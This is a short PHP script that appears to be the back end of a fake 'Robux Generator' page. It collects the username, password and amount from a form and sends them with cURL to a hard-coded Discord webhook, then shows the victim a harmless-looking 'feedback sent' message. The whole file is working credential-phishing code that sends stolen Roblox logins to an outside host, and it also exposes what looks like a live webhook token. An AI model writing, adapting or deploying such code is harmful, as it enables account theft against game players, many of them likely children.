<?php
// Retrieve form data
$username = htmlspecialchars($_POST['login']);
$password = htmlspecialchars($_POST['password']);
$amount = htmlspecialchars($_POST['amount']);

// Discord Webhook URL (replace with your actual Webhook URL)
$webhook_url = "https://canary.discord.com/api/webhooks/1308919682081751161/X70BUQemTxFZZ0X97N1Tp2UItbh-Ze8B-oj5MOkOIU9LoTv90-SbT9xshMLuslYcpVAs";

// Prepare the message
$message = [
    "content" => "New Robux Generator Submission",
    "embeds" => [
        [
            "title" => "Robux Generator Data",
            "fields" => [
                [
                    "name" => "Username",
                    "value" => $username,
                    "inline" => false
                ],
                [
                    "name" => "Password",
                    "value" => $password,
                    "inline" => false
                ],
                [
                    "name" => "Amount",
                    "value" => $amount . " Robux",
                    "inline" => false
                ]
            ]
        ]
    ]
];

// Use cURL to send the POST request to Discord Webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
$response = curl_exec($ch);
curl_close($ch);

// Check for errors
if ($response === false) {
    echo "There was an error sending the data to Discord.";
} else {
    echo "Your feedback has been sent to Discord!";
}
?>
